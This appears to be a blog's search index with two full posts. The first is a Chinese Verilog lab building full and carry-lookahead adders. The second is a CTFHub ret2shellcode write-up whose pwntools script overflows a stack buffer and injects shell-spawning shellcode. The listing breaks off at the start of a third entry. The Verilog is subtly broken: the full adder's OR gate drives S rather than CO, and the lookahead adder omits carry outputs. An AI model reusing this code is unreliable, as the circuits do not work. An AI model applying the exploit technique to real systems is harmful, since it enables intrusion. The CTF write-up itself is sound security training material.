<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>超前进位加法器设计实验</title>
      <link href="/2021/10/29/20211029-DC-adder/"/>
      <url>/2021/10/29/20211029-DC-adder/</url>
      
        <content type="html"><![CDATA[<h1 id="超前进位加法器设计实验"><a href="#超前进位加法器设计实验" class="headerlink" title="超前进位加法器设计实验"></a>超前进位加法器设计实验</h1><h2 id="新建工程"><a href="#新建工程" class="headerlink" title="新建工程"></a>新建工程</h2><h3 id="选择xc7a100tlcsg324-2L板卡型号"><a href="#选择xc7a100tlcsg324-2L板卡型号" class="headerlink" title="选择xc7a100tlcsg324-2L板卡型号"></a>选择<code>xc7a100tlcsg324-2L</code>板卡型号</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110282111260.png" alt="image-20211028211104426" style="zoom: 67%;" /><h2 id="1-结构描述建模全加器FA"><a href="#1-结构描述建模全加器FA" class="headerlink" title="1.结构描述建模全加器FA"></a>1.结构描述建模全加器FA</h2><h3 id="添加design-sources"><a href="#添加design-sources" class="headerlink" title="添加design sources"></a>添加design sources</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291536546.png" alt="image-20211028211439066" style="zoom:67%;" /><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用结构建模方式建模全加器FA模块</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> fa(A, B, CI, S, CO);</span><br><span class="line">    <span class="keyword">output</span> S, CO;</span><br><span class="line">    <span class="keyword">input</span>  A, B, CI;</span><br><span class="line">    <span class="keyword">wire</span>   S1, T1, T2, T3;</span><br><span class="line">    <span class="keyword">xor</span> XOR_1(S1, A, B),           <span class="comment">//S1 = A 异或 B</span></span><br><span class="line">        XOR_2(S, S1, CI);          <span class="comment">//S = S1 异或 CI</span></span><br><span class="line">    <span class="keyword">and</span> AND_1(T1, A, B),           <span class="comment">//T1 = AB</span></span><br><span class="line">        AND_2(T2, S1, CI);         <span class="comment">//T2 = S1CI</span></span><br><span class="line">    <span class="keyword">or</span> OR_1(S, T1, T2);            <span class="comment">//S = T1 + T2</span></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="添加simulation-sources"><a href="#添加simulation-sources" class="headerlink" title="添加simulation sources"></a>添加simulation sources</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110282213293.png" alt="image-20211028221334443" style="zoom:67%;" /><h3 id="仿真代码示例"><a href="#仿真代码示例" class="headerlink" title="仿真代码示例"></a>仿真代码示例</h3><p>利用脚本自动输出</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//~ `New testbench</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span>  1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> tb_fa;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fa Parameters</span></span><br><span class="line">    <span class="keyword">parameter</span> PERIOD  = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fa Inputs</span></span><br><span class="line">    <span class="keyword">reg</span>   A                                    = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   B                                    = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   CI                                   = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fa Outputs</span></span><br><span class="line">    <span class="keyword">wire</span>  S                                    ;</span><br><span class="line">    <span class="keyword">wire</span>  CO                                   ;</span><br><span class="line"></span><br><span class="line">    fa  u_fa (</span><br><span class="line">        <span class="variable">.A</span>                       ( A    ),</span><br><span class="line">        <span class="variable">.B</span>                       ( B    ),</span><br><span class="line">        <span class="variable">.CI</span>                      ( CI   ),</span><br><span class="line"></span><br><span class="line">        <span class="variable">.S</span>                       ( S    ),</span><br><span class="line">        <span class="variable">.CO</span>                      ( CO   )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">initial</span></span><br><span class="line">        &#123;A,B,CI&#125;=<span class="number">3&#x27;b0</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">always</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">#<span class="number">100</span>;</span><br><span class="line">&#123;A,B,CI&#125;=&#123;A,B,CI&#125; + <span class="number">1&#x27;b1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="仿真结果"><a href="#仿真结果" class="headerlink" title="仿真结果"></a>仿真结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291537964.png" alt="image-20211028223223028" style="zoom:80%;" /><h2 id="2-四位串行加法器"><a href="#2-四位串行加法器" class="headerlink" title="2.四位串行加法器"></a>2.四位串行加法器</h2><h3 id="添加的design-sources"><a href="#添加的design-sources" class="headerlink" title="添加的design sources"></a>添加的design sources</h3><p>PS：操作与前面相同</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4位串行进位加法器</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> FourBitFA(X, Y, Cin, Sum, Cout);</span><br><span class="line">    <span class="keyword">parameter</span> size = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">input</span> [size-<span class="number">1</span>:<span class="number">0</span>] X, Y;</span><br><span class="line">    <span class="keyword">output</span> [size-<span class="number">1</span>:<span class="number">0</span>] Sum;</span><br><span class="line">    <span class="keyword">input</span> Cin;</span><br><span class="line">    <span class="keyword">output</span> Cout;</span><br><span class="line">    <span class="keyword">wire</span> [size-<span class="number">1</span>:<span class="number">1</span>] C;</span><br><span class="line">    <span class="comment">//fa(A, B, CI, S, CO);</span></span><br><span class="line">    fa fa0(X[<span class="number">0</span>], Y[<span class="number">0</span>], Cin, Sum[<span class="number">0</span>], C[<span class="number">1</span>]),</span><br><span class="line">        fa1(X[<span class="number">1</span>], Y[<span class="number">1</span>], C[<span class="number">1</span>], Sum[<span class="number">1</span>], C[<span class="number">2</span>]),</span><br><span class="line">        fa2(X[<span class="number">2</span>], Y[<span class="number">2</span>], C[<span class="number">2</span>], Sum[<span class="number">2</span>], C[<span class="number">3</span>]),</span><br><span class="line">        fa3(X[<span class="number">3</span>], Y[<span class="number">3</span>], C[<span class="number">3</span>], Sum[<span class="number">3</span>], Cout);</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><p>添加完之后，<code>FourBitFA</code>模块会自动置顶，并且包含<code>fa</code>模块</p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110290921329.png" alt="image-20211029092052343" style="zoom:80%;" /><h3 id="添加simulation-sources-1"><a href="#添加simulation-sources-1" class="headerlink" title="添加simulation sources"></a>添加simulation sources</h3><p>可由脚本自动生成（有删改）</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//~ `New testbench</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span>  1ns / 1ps  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> tb_FourBitFA;   </span><br><span class="line">    <span class="comment">// FourBitFA Parameters</span></span><br><span class="line">    <span class="keyword">parameter</span> PERIOD = <span class="number">10</span>; </span><br><span class="line">    <span class="keyword">parameter</span> size  = <span class="number">4</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// FourBitFA Inputs</span></span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  X                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  Y                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   Cin                                  = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FourBitFA Outputs</span></span><br><span class="line">    <span class="keyword">wire</span>  [size-<span class="number">1</span>:<span class="number">0</span>]  Sum                      ;</span><br><span class="line">    <span class="keyword">wire</span>  Cout                                 ;</span><br><span class="line"></span><br><span class="line">    FourBitFA #(</span><br><span class="line">        <span class="variable">.size</span> ( size ))</span><br><span class="line">    u_FourBitFA (</span><br><span class="line">        <span class="variable">.X</span>                       ( X     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Y</span>                       ( Y     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cin</span>                     ( Cin              ),</span><br><span class="line"></span><br><span class="line">        <span class="variable">.Sum</span>                     ( Sum   [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cout</span>                    ( Cout             )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">initial</span></span><br><span class="line">        &#123;X, Y, Cin&#125; = <span class="number">9&#x27;b0</span>;</span><br><span class="line"><span class="keyword">always</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">#<span class="number">100</span>;</span><br><span class="line">&#123;X, Y, Cin&#125; = &#123;X, Y, Cin&#125; + <span class="number">1&#x27;b1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="仿真结果-1"><a href="#仿真结果-1" class="headerlink" title="仿真结果"></a>仿真结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291537386.png" alt="image-20211029092445491" style="zoom:80%;" /><h2 id="3-数据流法实现超前进位电路"><a href="#3-数据流法实现超前进位电路" class="headerlink" title="3.数据流法实现超前进位电路"></a>3.数据流法实现超前进位电路</h2><h3 id="添加design-sources-1"><a href="#添加design-sources-1" class="headerlink" title="添加design sources"></a>添加design sources</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4位超前进位电路</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> CarryAheadAdd(X, Y, Cin, Cout);</span><br><span class="line">    <span class="keyword">parameter</span> size = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">input</span> [size-<span class="number">1</span>:<span class="number">0</span>] X, Y;</span><br><span class="line">    <span class="keyword">input</span> Cin;</span><br><span class="line">    <span class="comment">// output [size-1:0] Sum;</span></span><br><span class="line">    <span class="keyword">output</span> [size:<span class="number">0</span>] Cout;</span><br><span class="line">    <span class="keyword">wire</span> [size:<span class="number">0</span>] C, G, P;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">0</span>] = Cin;</span><br><span class="line">    <span class="keyword">assign</span> P = X ^ Y;</span><br><span class="line">    <span class="keyword">assign</span> G = X &amp; Y;</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">1</span>] = G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">2</span>] = G[<span class="number">1</span>] | (P[<span class="number">1</span>] &amp; (G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>])));</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">3</span>] = G[<span class="number">2</span>] | (P[<span class="number">2</span>] &amp; (G[<span class="number">1</span>] | (P[<span class="number">1</span>] &amp; (G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>])))));</span><br><span class="line">    <span class="keyword">assign</span> C[<span class="number">4</span>] = G[<span class="number">3</span>] | (P[<span class="number">3</span>] &amp; (G[<span class="number">2</span>] | (P[<span class="number">2</span>] &amp; (G[<span class="number">1</span>] | (P[<span class="number">1</span>] &amp; (G[<span class="number">0</span>] | (P[<span class="number">0</span>] &amp; C[<span class="number">0</span>])))))));</span><br><span class="line">    <span class="comment">// assign Sum = P ^ C[3:0];</span></span><br><span class="line">    <span class="keyword">assign</span> Cout = C;</span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h2 id="4-四位超前进位加法器"><a href="#4-四位超前进位加法器" class="headerlink" title="4.四位超前进位加法器"></a>4.四位超前进位加法器</h2><h3 id="添加design-sources-2"><a href="#添加design-sources-2" class="headerlink" title="添加design sources"></a>添加design sources</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4位超前进位加法器</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span> 1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> CarryAheadAdder(Sum, Cout, X, Y, Cin);</span><br><span class="line">    <span class="keyword">parameter</span> size = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">input</span> [size-<span class="number">1</span>:<span class="number">0</span>] X, Y;</span><br><span class="line">    <span class="keyword">input</span> Cin;</span><br><span class="line">    <span class="keyword">output</span> [size-<span class="number">1</span>:<span class="number">0</span>] Sum;</span><br><span class="line">    <span class="keyword">output</span> Cout;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">wire</span> [size:<span class="number">0</span>] C;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CarryAheadAdd(X, Y, Cin, Cout);</span></span><br><span class="line">    CarryAheadAdd CarryAheadAdd_0(X, Y, Cin, C);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//fa(A, B, CI, S, CO);</span></span><br><span class="line">    fa fa0(X[<span class="number">0</span>], Y[<span class="number">0</span>], Cin, Sum[<span class="number">0</span>]),</span><br><span class="line">        fa1(X[<span class="number">1</span>], Y[<span class="number">1</span>], C[<span class="number">1</span>], Sum[<span class="number">1</span>]),</span><br><span class="line">        fa2(X[<span class="number">2</span>], Y[<span class="number">2</span>], C[<span class="number">2</span>], Sum[<span class="number">2</span>]),</span><br><span class="line">        fa3(X[<span class="number">3</span>], Y[<span class="number">3</span>], C[<span class="number">3</span>], Sum[<span class="number">3</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assign</span> Cout = C[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="添加simulation-sources-2"><a href="#添加simulation-sources-2" class="headerlink" title="添加simulation sources"></a>添加simulation sources</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//~ `New testbench</span></span><br><span class="line"><span class="meta">`<span class="meta-keyword">timescale</span>  1ns / 1ps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> tb_CarryAheadAdder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CarryAheadAdder Parameters</span></span><br><span class="line">    <span class="keyword">parameter</span> PERIOD = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">parameter</span> size  = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CarryAheadAdder Inputs</span></span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  X                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   [size-<span class="number">1</span>:<span class="number">0</span>]  Y                        = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">reg</span>   Cin                                  = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CarryAheadAdder Outputs</span></span><br><span class="line">    <span class="keyword">wire</span>  [size-<span class="number">1</span>:<span class="number">0</span>]  Sum                      ;</span><br><span class="line">    <span class="keyword">wire</span>  Cout                                 ;</span><br><span class="line"></span><br><span class="line">    CarryAheadAdder #(</span><br><span class="line">        <span class="variable">.size</span> ( size ))</span><br><span class="line">    u_CarryAheadAdder (</span><br><span class="line">        <span class="variable">.X</span>                       ( X     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Y</span>                       ( Y     [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cin</span>                     ( Cin              ),</span><br><span class="line"></span><br><span class="line">        <span class="variable">.Sum</span>                     ( Sum   [size-<span class="number">1</span>:<span class="number">0</span>] ),</span><br><span class="line">        <span class="variable">.Cout</span>                    ( Cout             )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">initial</span> </span><br><span class="line">        &#123;X, Y, Cin&#125; = <span class="number">9&#x27;b0</span>;</span><br><span class="line">    <span class="keyword">always</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        #<span class="number">100</span>;</span><br><span class="line">&#123;X, Y, Cin&#125; = &#123;X, Y, Cin&#125; + <span class="number">1&#x27;b1</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="仿真结果-2"><a href="#仿真结果-2" class="headerlink" title="仿真结果"></a>仿真结果</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291408837.png" alt="image-20211029140834986" style="zoom: 80%;" /><h3 id="原理图（RTL分析）"><a href="#原理图（RTL分析）" class="headerlink" title="原理图（RTL分析）"></a>原理图（RTL分析）</h3><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291600646.png" alt="img"  /><h2 id="5-板级验证"><a href="#5-板级验证" class="headerlink" title="5.板级验证"></a>5.板级验证</h2><p>经过综合、实现、比特流之后，编写管脚约束文件</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">set_property IOSTANDARD LVCMOS18 [get_ports &#123;X[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property PACKAGE_PIN V5 [get_ports &#123;X[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T4&#125; [get_ports &#123;X[<span class="number">2</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN V6&#125; [get_ports &#123;X[<span class="number">1</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T5&#125; [get_ports &#123;X[<span class="number">0</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T6&#125; [get_ports &#123;Y[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN V7&#125; [get_ports &#123;Y[<span class="number">2</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R8&#125; [get_ports &#123;Y[<span class="number">1</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN U9&#125; [get_ports &#123;Y[<span class="number">0</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN T9&#125; [get_ports Cin]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN U6&#125; [get_ports &#123;Sum[<span class="number">3</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R5&#125; [get_ports &#123;Sum[<span class="number">2</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN U7&#125; [get_ports &#123;Sum[<span class="number">1</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R6&#125; [get_ports &#123;Sum[<span class="number">0</span>]&#125;]</span><br><span class="line">set_property -dict &#123;IOSTANDARD LVCMOS18 PACKAGE_PIN R7&#125; [get_ports Cout]</span><br></pre></td></tr></table></figure><p>将程序下载到电路板</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110291524608.jpg" alt="IMG_20211029_152219"></p>]]></content>
      
      
      <categories>
          
          <category> 数字电路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字电路 </tag>
            
            <tag> vivado </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-PWN-ret2shellcode</title>
      <link href="/2021/10/26/20211026_ctf_ret2shellcode/"/>
      <url>/2021/10/26/20211026_ctf_ret2shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHUB-PWN-ret2shellcode"><a href="#CTFHUB-PWN-ret2shellcode" class="headerlink" title="CTFHUB-PWN-ret2shellcode"></a>CTFHUB-PWN-ret2shellcode</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262106244.png" alt="image-20211026210556140"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262106440.png" alt="image-20211026210637404"></p><p>从main函数来看，程序运行时会先输出buf_addr，利用exp脚本获取它即可。</p><p>然后程序给出一个输入点，可以通过覆盖完这个输入点，返回到我们获得的buf_addr，再通过溢出达到shellcode</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262121280.png" alt="image-20211026212119240"></p><p>可以看到一串地址，但它会每次变化</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;challenge-2e237696f74ad1c2.sandbox.ctfhub.com&#x27;, 24809)</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;it : [&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">shellcode_addr = buf_addr + <span class="number">0x10</span> + <span class="number">0x8</span> + <span class="number">0x8</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(shellcode_addr) + shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;someting : &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110262152218.png" alt="image-20211026215229086"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB-PWN-ret2text</title>
      <link href="/2021/10/25/20211025_ctf_pwn/"/>
      <url>/2021/10/25/20211025_ctf_pwn/</url>
      
